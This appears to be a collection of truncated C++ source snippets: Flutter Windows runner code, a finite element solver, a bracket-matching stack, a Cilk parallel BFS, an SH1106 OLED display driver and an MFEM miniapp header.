    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"todo_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/* TO COMPILE:\n g++ *.cpp *.h -o ./output.exe\n \n */\n#include<vector>\n#include<cmath>\n#include<iostream>\n#include<eigen3/Eigen/Dense>\n\n#define f float\n\n#define DIRICHLET 0\n#define NEUMANN 1\n\n\nusing namespace std;\nusing namespace Eigen;\n\nstruct contourCondition\n{\n    f value;\n    int type;\n};\n\ncontourCondition create_contourCondition(f value, int type)\n{\n    contourCondition cc;\n    cc.value = value;\n    cc.type = type;\n    return cc;\n}\n\nf G(f x)\n{\n    return 1;\n}\n\nvoid printvector(vector<f> v)\n{\n    for(int i = 0; i<v.size(); i++)\n    {\n        cout<<v[i]<<\",\";\n    }\n    cout<<endl;\n}\n\nvoid printmatrix(vector<vector<f>> m)\n{\n    for(int i = 0; i<m.size(); i++)\n    {  \n        cout<<\"[\";\n        for (int j = 0; j<m[0].size(); j++)\n        {\n            cout<<m[i][j]<<\",\";\n        }\n        cout<<\"]\"<<endl;\n    }\n}\n\n// Fun\u00e7\u00e3o para realizar a decomposi\u00e7\u00e3o LU\nvoid decomposeLU(std::vector<std::vector<f>>& A, std::vector<std::vector<f>>& L, std::vector<std::vector<f>>& U) {\n    int n = A.size();\n\n    // Inicializa L e U com zeros\n    L = std::vector<std::vector<f>>(n, std::vector<f>(n, 0));\n    U = std::vector<std::vector<f>>(n, std::vector<f>(n, 0));\n\n    // Preenche U com os elementos de A\n    for (int i = 0; i < n; i++) {\n        for (int j = 0; j < n; j++) {\n            U[i][j] = A[i][j];\n        }\n    }\n\n    // Preenche a diagonal de L com 1s\n    for (int i = 0; i < n; i++) {\n        L[i][i] = 1;\n    }\n\n    // Realiza a decomposi\u00e7\u00e3o LU\n    for (int k = 0; k < n - 1; k++) {\n        for (int i = k + 1; i < n; i++) {\n            L[i][k] = U[i][k] / U[k][k];\n            for (int j = k; j < n; j++) {\n                U[i][j] -= L[i][k] * U[k][j];\n            }\n        }\n    }\n}\n\n// Fun\u00e7\u00e3o para resolver um sistema linear Ax = b usando a decomposi\u00e7\u00e3o LU\nstd::vector<f> solveUsingLU(std::vector<std::vector<f>>& A, std::vector<f>& b) {\n    int n = A.size();\n    std::vector<std::vector<f>> L, U;\n\n    // Realiza a decomposi\u00e7\u00e3o LU\n    decomposeLU(A, L, U);\n\n    // Resolve Ly = b\n    std::vector<f> y(n);\n    for (int i = 0; i < n; i++) {\n        f sum = 0;\n        for (int j = 0; j < i; j++) {\n            sum += L[i][j] * y[j];\n        }\n        y[i] = (b[i] - sum) / L[i][i];\n    }\n\n    // Resolve Ux = y\n    std::vector<f> x(n);\n    for (int i = n - 1; i >= 0; i--) {\n        f sum = 0;\n        for (int j = i + 1; j < n; j++) {\n            sum += U[i][j] * x[j];\n        }\n        x[i] = (y[i] - sum) / U[i][i];\n    }\n\n    return x;\n}\n\n\nvector<f> gauss_weights(int nint)\n{\n    vector<f> w(nint, 0);\n    switch (nint)\n    {\n    case 2:\n        w[0] = 1.0;\n        w[1] = 1.0;\n        break;\n    \n    default:\n        cout<<\"gauss_weights error: n\u00e3o implementei esse n\u00famero de pontos de integra\u00e7\u00e3o ainda\"<<endl;\n        break;\n    }\n    return w;\n}\n\nf*** create_shg(int nen, int nint)\n{\n    f*** shg = new f**[2];\n    shg[0] = new f*[nen];\n    shg[1] =  new f*[nen];\n\n    vector<f> pt(nint, 0);\n    switch (nint)\n    {\n    case 2:\n        pt.push_back(-1/sqrt(3));\n        pt.push_back(1/sqrt(3));\n        break;\n    \n    default:\n        cout<<\"shg error: n\u00e3o implementei esse n\u00famero de pontos de integra\u00e7\u00e3o ainda\"<<endl;\n\n        break;\n    }\n    \n    for(int j=0;j<nen; j++)\n    {\n        shg[0][j] = new f[nint];\n        shg[1][j] = new f[nint];\n    }\n    \n    //Preenchimento do shg\n    for(int l = 0; l<nint; l++)\n    {\n        f t = pt[l];\n        switch (nen)\n        {\n        case 2: \n            shg[0][0][l] = (1.0 - t)/2.0;\n            shg[0][1][l] = (1.0 + t)/2.0;\n            shg[1][0][l] = -1.0/2.0;\n            shg[1][1][l] = 1.0/2.0;\n            break;\n        \n        default:\n            break;\n        }\n    }\n\n    return shg; \n}\n\nvoid fem(int nel, int nint, int nen, f h, f epslon, f gamma, contourCondition k1, contourCondition k2)\n{\n    //Inicializando a matrix e o vetor fonte\n    // vector<vector<f>> K(1 + ((nint-1)*nel), vector<f>(1 + ((nint-1)*nel), 0));\n    MatrixXd K = MatrixXd::Zero(1+(nint-1)*nel, 1+(nint-1)*nel);\n    VectorXd F = VectorXd::Zero(1+(nint-1)*nel);\n    // vector<f> F(1 + ((nint-1)*nel), 0);\n\n    //Inicialize weight vector\n    vector<f> w = gauss_weights(nint);\n\n    //Inicializando shg\n    f*** shg = create_shg(nen, nint);\n\n    vector<f> x(nel+1, 0); \n    for(int i = 0; i <nel+1;i++)\n    {\n        x[i] = i*h;\n    }\n\n    for(int n = 0; n < nel; n++)\n    {\n        int offset = n + (nen-2); \n        for(int l=0; l<nint; l++)\n        {\n            f xx = 0;\n            for(int i=0; i<nen; i++)\n            {\n                xx = xx + shg[0][i][l]*(x[n] + i*h/nen);\n            }\n\n            for(int j = 0; j<nen; j++)\n            {\n                F(j+offset) = F(j+offset) + G(xx) * shg[0][j][l]* w[l] * h/2;\n\n                for(int i = 0; i<nen; i++)\n                {\n                    K(i+offset,j+offset) = K(i+offset,j+offset)+ epslon*(shg[1][i][l] * shg[1][j][l] * 2/h * w[l]) + gamma*(shg[0][i][l]*shg[0][j][l]*w[l]*h/2);\n                }\n            }\n        }\n\n    }\n\n    //Condi\u00e7\u00f5es de contorno:\n    //Diric",
    "#include <iostream>\nusing namespace std;\ntemplate <class t>\nclass Stack\n{\npublic:\n    int size, top;\n    t *arr;\n    Stack(int size)\n    {\n        top = -1;\n        this->size = size;\n    }\n};\nclass StackOperations\n{\nprivate:\npublic:\n    Stack<char> *s;\n    void createStack(int size);\n    void pushIntoStack(char element);\n    void popFromStack();\n    bool isEmpty();\n    bool isFull();\n    void viaSualizeStack();\n    bool isWellParenthesized(string expression);\n};\nvoid StackOperations::createStack(int size)\n{\n    s = new Stack<char>(size);\n    s->arr = new char[s->size]; // i thin this will allocate dynamic mempory another approach using malloc\n}\nbool StackOperations::isEmpty()\n{\n    return s->top == -1 ? true : false;\n}\nbool StackOperations::isFull()\n{\n    return s->top == s->size - 1 ? true : false;\n}\nvoid StackOperations::pushIntoStack(char element)\n{\n    if (isFull())\n    {\n        cout << \"stack overflow!\" << endl;\n        return;\n    }\n    s->top++;\n    s->arr[s->top] = element;\n}\nvoid StackOperations::viaSualizeStack()\n{\n    for (int i = 0; i <= s->top; i++)\n    {\n        cout << \"|\" << s->arr[i] << \"|\" << endl;\n    }\n}\nvoid StackOperations::popFromStack()\n{\n    if (isEmpty())\n    {\n        cout << \"stack underFlow!\" << endl;\n        return;\n    }\n    s->top--;\n}\nbool ::StackOperations::isWellParenthesized(string exp)\n{\n    for (int i = 0; i < exp.length(); i++)\n    {\n        if (exp[i] == '(' || exp[i] == '[' || exp[i] == '{')\n        {\n            pushIntoStack(exp[i]);\n        }\n        else if (((s->top) >= 0) && (s->arr[s->top] == '(' && exp[i] == ')' || s->arr[s->top] == '[' && exp[i] == ']' || s->arr[s->top] == '{' && exp[i] == '}'))\n        {\n            popFromStack();\n        }\n        else if (exp[i] == ')' || exp[i] == ']' || exp[i] == '}')\n        {\n            // pushIntoStack(exp[i]); this can't be prefered because we only pushing opening brackets but it worked!\n            cout << \"not well parenthesized<<endl\";\n            \n            return false;\n        }\n    }\n    if (isEmpty())\n    {\n        cout << \"your expression is well parenthesized...\" << endl;\n        return true;\n    }\n    else\n    {\n        cout << \"not well parenthesized....\" << endl;\n        return false;\n    }\n}\n\nint main()\n{\n    StackOperations stp;\n    stp.createStack(12);\n    // stp.pushIntoStack('c');\n    // stp.pushIntoStack('d');\n    // stp.pushIntoStack('g');\n    stp.isWellParenthesized(\"(})\");\n    stp.viaSualizeStack();\n\n    return 0;\n}",
    "#include \"SimpleSprite.h\"\n\n//---------------------------------------------------------------------------------------------------------\n// CONSTRUTORES E DESTRUTORES\n//---------------------------------------------------------------------------------------------------------\n\nSimpleSprite::SimpleSprite(char* fileSource, int cx, int cy, int cw, int ch)\n{\n    //this->img = IMG_LoadTexture(Sprite::res->renderer, \"braid-jump-teste.png\");\n    this->cx = cx;\n    this->cy = cy;\n    this->cw = cw;\n    this->ch = ch;\n    init();\n}\n\nSimpleSprite::~SimpleSprite()\n{\n}\n\n//---------------------------------------------------------------------------------------------------------\n// GETTERS & SETTERS\n//---------------------------------------------------------------------------------------------------------\n\n\n//---------------------------------------------------------------------------------------------------------\n// M\u00c9TODOS\n//---------------------------------------------------------------------------------------------------------\n\nvoid SimpleSprite::init()\n{\n    //initFramesList(1);\n    // if(this->cw == 0)              // se a largura do recorte n\u00e3o for passado...\n    //     this->cw = this.img.width;  // \u00e9 a da pr\u00f3pria imagem\n    // if(this->ch == 0)              // se a altura do recorte n\u00e3o for passado...\n    //     this.ch = this.img.height; // \u00e9 a da pr\u00f3pria imagem\n}\n\n//---------------------------------------------------------------------------------------------------------\n// M\u00c9TODOS DO GAMELOOP\n//---------------------------------------------------------------------------------------------------------\n\n\nvoid SimpleSprite::render()\n{\n    //SDL_RenderCopy(this->res->renderer, this->img, this->getFrame(),this->getFrame());\n}",
    "#include <iostream>\n#include <algorithm>\n#include \"cilk/cilk.h\"\n#include <ctime>\n#include <chrono>\n#include <queue>\n\n//#define int long long\n\nusing namespace std;\n\n//const int BLOCK = 32;\n\n//void p_for(int times, int counter, void (*f)()) {\nvoid p_for(int times, int counter, function<void(void)> f) {\n    if (times < 2) {\n        f();\n        return;\n    }\n    int times1 = times / 2;\n    cilk_scope {\n            cilk_spawn p_for(times1, counter, f);\n            p_for(times - times1, counter + times1, f);\n    };\n}\n\n//void p_for(int times, int counter, void (*f)(int i)) {\nvoid p_for(int times, int counter, function<void(int)> f) {\n    if (times < 2) {\n        f(counter);\n        return;\n    }\n    int times1 = times / 2;\n    cilk_scope {\n            cilk_spawn p_for(times1, counter, f);\n            p_for(times - times1, counter + times1, f);\n    };\n}\n\n\n//vector<int> scan(int* l, int* r) {\n//    int p = 1;\n//    int deg = 0;\n//    while (p < r - l) {\n//        deg++;\n//        p *= 2;\n//    }\n////    int* arr = new int[p];\n//    vector<int> arr = vector<int>(p, 0);\n//    memcpy(arr.data(), l, (r - l) * sizeof(int));\n//    for (int i = 2; i <= p; i *= 2) {\n//        p_for(p / i, 0, [&](int j) {\n//            arr[j*i+i-1] = arr[j*i+i/2-1] + arr[j*i+i-1];\n//        });\n//    }\n//    arr[p-1] = 0;\n//    for (int i = p; i > 1; i /= 2) {\n//        p_for(p / i, 0, [&](int j) {\n//            int sum = arr[j*i+i-1] + arr[j*i+i/2-1];\n//            arr[j*i+i/2-1] = arr[j*i+i-1];\n//            arr[j*i+i-1] = sum;\n//        });\n//    }\n//    return arr;\n//}\n\nvoid in_place_scan(int* l, int* r) {\n    int p = 1;\n    int deg = 0;\n    while (p < r - l) {\n        deg++;\n        p *= 2;\n    }\n//    int* arr = new int[p];\n    vector<int> arr = vector<int>(p, 0);\n    memcpy(arr.data(), l, (r - l) * sizeof(int));\n    for (int i = 2; i <= p; i *= 2) {\n        p_for(p / i, 0, [&](int j) {\n            arr[j*i+i-1] = arr[j*i+i/2-1] + arr[j*i+i-1];\n        });\n    }\n    arr[p-1] = 0;\n    for (int i = p; i > 1; i /= 2) {\n        p_for(p / i, 0, [&](int j) {\n            int sum = arr[j*i+i-1] + arr[j*i+i/2-1];\n            arr[j*i+i/2-1] = arr[j*i+i-1];\n            arr[j*i+i-1] = sum;\n        });\n    }\n    memcpy(l, arr.data(), (r - l) * sizeof(int));\n}\n\nvector<int> filter(vector<int> src, function<bool(int)> f) {\n    vector<int> result = vector<int>();\n    for (int i : src) {\n        if (f(i))\n            result.push_back(i);\n    }\n    return result;\n}\n\nvector<int> a;\n\nvoid par_bfs(vector<vector<int>> gr) {\n    a = vector<int>(gr.size(), -1);\n    vector<vector<int>> f = vector<vector<int>>(gr.size(), vector<int>());\n    f[0] = vector<int>(1, 0);\n    a[0] = 0;\n    for (int i = 0; i < gr.size() && !f[i].empty(); i++) {\n        vector<int> deg = vector<int>(f[i].size(), 0);\n//        p_for(f[i]->size(), 0, [&](int j) {\n//            deg[j] = gr[(*f[i])[j]].size();\n//        });\n        for(int j = 0; j < f[i].size(); j++) {\n            deg[j] = gr[f[i][j]].size();\n        }\n        in_place_scan(deg.data(), deg.data() + deg.size());\n        f[i+1] = vector<int>(deg[f[i].size()-1] + gr[f[i][f[i].size()-1]].size(), -1);\n        p_for(f[i].size(), 0, [&](int j) {\n            for (int vi = 0; vi < gr[f[i][j]].size(); vi++) {\n                int v = gr[f[i][j]][vi];\n//                if (i == 0) {\n//                    cout << v << \"\\n\";\n//                }\n                if (a[v] == -1) {\n                    a[v] = i+1;\n                    f[i+1][deg[j]+vi] = v;\n                }\n            }\n        });\n        f[i+1] = filter(f[i+1], [](int x) { return x >= 0; });\n//        if (i == 8) {\n//            for (int j = 0; j < f[i+1].size(); j++)\n//                cout << f[i+1][j] << \" \";\n//            cout << \"\\n\";\n//        }\n    }\n//    return a;\n}\n\nvoid bfs(vector<vector<int>> gr) {\n    a = vector<int>(gr.size(), -1);\n    queue<int> q = queue<int>();\n    q.push(0);\n    for (int i = 0; !q.empty(); i++) {\n        int v = q.front();\n        q.pop();\n        for (int u : gr[v]) {\n            if (a[u] == -1) {\n                a[u] = i;\n                q.push(u);\n            }\n        }\n    }\n}\n\nsigned main() {\n//    p_for(4, 0, []() { cout << \"10 \"; });\n    p_for(4, 0, [](int a) { cout << a << \" \"; });\n    cout << \"\\n\";\n\n    vector<int> arr = {1, 2, 3, 4, 5, 6, 7, 8};\n    in_place_scan(arr.data(), arr.data() + arr.size());\n    for (int i = 0; i < arr.size(); i++)\n        cout << arr[i] << \" \";\n    cout << \"\\n\\n\";\n\n    int n = 300;\n    int n2 = n * n;\n    int n3 = n * n * n;\n    vector<vector<int>> gr = vector<vector<int>>(n3, vector<int>());\n    for (int i = 0; i < n; i++) {\n        for (int j = 0; j < n; j++) {\n            for (int k = 0; k < n; k++) {\n                if (i > 0) gr[i*n2 + j*n + k].push_back((i-1)*n2 + j*n + k);\n                if (i < n-1) gr[i*n2 + j*n + k].push_back((i+1)*n2 + j*n + k);\n                if (j > 0) gr[i*n2 + j*n + k].push_back(i*n2 + (j-1)*n + k);\n                if (j < n-1) gr[i*n2 + j*n + k].push_back(i*n2 + (j+1",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "/*********************************************************************\nThis is a library for our Monochrome OLEDs based on SSD1306 drivers\n\n  Pick one up today in the adafruit shop!\n  ------> http://www.adafruit.com/category/63_98\n\nThese displays use SPI to communicate, 4 or 5 pins are required to  \ninterface\n\nAdafruit invests time and resources providing this open source code, \nplease support Adafruit and open-source hardware by purchasing \nproducts from Adafruit!\n\nWritten by Limor Fried/Ladyada  for Adafruit Industries.  \nBSD license, check license.txt for more information\nAll text above, and the splash screen below must be included in any redistribution\n*********************************************************************/\n\n/*********************************************************************\nI change the adafruit SSD1306 to SH1106\n\nSH1106 driver similar to SSD1306 so, just change the display() method.\n\nHowever, SH1106 driver don't provide several functions such as scroll commands.\n\n\n*********************************************************************/\n\n#include <avr/pgmspace.h>\n#ifndef __SAM3X8E__\n #include <util/delay.h>\n#endif\n#include <stdlib.h>\n\n#include <Wire.h>\n\n#include \"Adafruit_GFX.h\"\n#include \"Adafruit_SH1106.h\"\n\n// the memory buffer for the LCD\n\nstatic uint8_t buffer[SH1106_LCDHEIGHT * SH1106_LCDWIDTH / 8] = { \n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80,\n0x80, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x80, 0x80, 0xC0, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x80, 0xC0, 0xE0, 0xF0, 0xF8, 0xFC, 0xF8, 0xE0, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x80, 0x80,\n0x80, 0x80, 0x00, 0x80, 0x80, 0x00, 0x00, 0x00, 0x00, 0x80, 0x80, 0x80, 0x80, 0x80, 0x00, 0xFF,\n#if (SH1106_LCDHEIGHT * SH1106_LCDWIDTH > 96*16)\n0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x80, 0x80, 0x80, 0x80, 0x00, 0x00, 0x80, 0x80, 0x00, 0x00,\n0x80, 0xFF, 0xFF, 0x80, 0x80, 0x00, 0x80, 0x80, 0x00, 0x80, 0x80, 0x80, 0x80, 0x00, 0x80, 0x80,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x80, 0x00, 0x00, 0x8C, 0x8E, 0x84, 0x00, 0x00, 0x80, 0xF8,\n0xF8, 0xF8, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xE0, 0xE0, 0xC0, 0x80,\n0x00, 0xE0, 0xFC, 0xFE, 0xFF, 0xFF, 0xFF, 0x7F, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFE, 0xFF, 0xC7, 0x01, 0x01,\n0x01, 0x01, 0x83, 0xFF, 0xFF, 0x00, 0x00, 0x7C, 0xFE, 0xC7, 0x01, 0x01, 0x01, 0x01, 0x83, 0xFF,\n0xFF, 0xFF, 0x00, 0x38, 0xFE, 0xC7, 0x83, 0x01, 0x01, 0x01, 0x83, 0xC7, 0xFF, 0xFF, 0x00, 0x00,\n0x01, 0xFF, 0xFF, 0x01, 0x01, 0x00, 0xFF, 0xFF, 0x07, 0x01, 0x01, 0x01, 0x00, 0x00, 0x7F, 0xFF,\n0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x7F, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0xFF,\n0xFF, 0xFF, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x03, 0x0F, 0x3F, 0x7F, 0x7F, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xE7, 0xC7, 0xC7, 0x8F,\n0x8F, 0x9F, 0xBF, 0xFF, 0xFF, 0xC3, 0xC0, 0xF0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFC, 0xFC, 0xFC,\n0xFC, 0xFC, 0xFC, 0xFC, 0xFC, 0xF8, 0xF8, 0xF0, 0xF0, 0xE0, 0xC0, 0x00, 0x01, 0x03, 0x03, 0x03,\n0x03, 0x03, 0x01, 0x03, 0x03, 0x00, 0x00, 0x00, 0x00, 0x01, 0x03, 0x03, 0x03, 0x03, 0x01, 0x01,\n0x03, 0x01, 0x00, 0x00, 0x00, 0x01, 0x03, 0x03, 0x03, 0x03, 0x01, 0x01, 0x03, 0x03, 0x00, 0x00,\n0x00, 0x03, 0x03, 0x00, 0x00, 0x00, 0x03, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01,\n0x03, 0x03, 0x03, 0x03, 0x03, 0x01, 0x00, 0x00, 0x00, 0x01, 0x03, 0x01, 0x00, 0x00, 0x00, 0x03,\n0x03, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n#if (SH1106_LCDHEIGHT == 64)\n0x00, 0x00, 0x00, 0x80, 0xC0, 0xE0, 0xF0, 0xF9, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x3F, 0x1F, 0x0F,\n0x87, 0xC7, 0xF7, 0xFF, 0xFF, 0x1F, 0x1F, 0x3D, 0xFC, 0xF8, 0xF8, 0xF8, 0xF8, 0x7C, 0x7D, 0xFF,\n0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x7F, 0x3F, 0x0F, 0x07, 0x00, 0x30, 0x30, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0xFE, 0xFE, 0xFC, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x",
    "// Copyright (c) 2010-2024, Lawrence Livermore National Security, LLC. Produced\n// at the Lawrence Livermore National Laboratory. All Rights reserved. See files\n// LICENSE and NOTICE for details. LLNL-CODE-806117.\n//\n// This file is part of the MFEM library. For more information and source code\n// availability visit https://mfem.org.\n//\n// MFEM is free software; you can redistribute it and/or modify it under the\n// terms of the BSD-3 license. We welcome feedback and contributions, see file\n// CONTRIBUTING.md for details.\n//\n//     ----------------------------------------------------------------\n//     SeqHeat Miniapp: Gradients of PDE constrained objective function\n//     ----------------------------------------------------------------\n//                          (Sequential Version)\n//\n// The following example computes the gradients of a specified objective\n// function with respect to parametric fields. The objective function is having\n// the following form f(u(\\rho)) where u(\\rho) is a solution of a specific state\n// problem (in the example that is the diffusion equation), and \\rho is a\n// parametric field discretized by finite elements. The parametric field (also\n// called density in topology optimization) controls the coefficients of the\n// state equation. For the considered case, the density controls the diffusion\n// coefficient within the computational domain.\n//\n// For more information, the users are referred to:\n//\n//    Hinze, M.; Pinnau, R.; Ulbrich, M. & Ulbrich, S.\n//    Optimization with PDE Constraints\n//    Springer Netherlands, 2009\n//\n//    Bends\u00f8e, M. P. & Sigmund, O.\n//    Topology Optimization - Theory, Methods and Applications\n//    Springer Verlag, Berlin Heidelberg, 2003\n//\n// Compile with: make seqheat\n//\n// Sample runs:\n//\n//    seqheat -m ../../data/star-mixed.mesh\n//    seqheat --visualization\n\n#include \"mfem.hpp\"\n#include <fstream>\n#include <iostream>\n\n#include 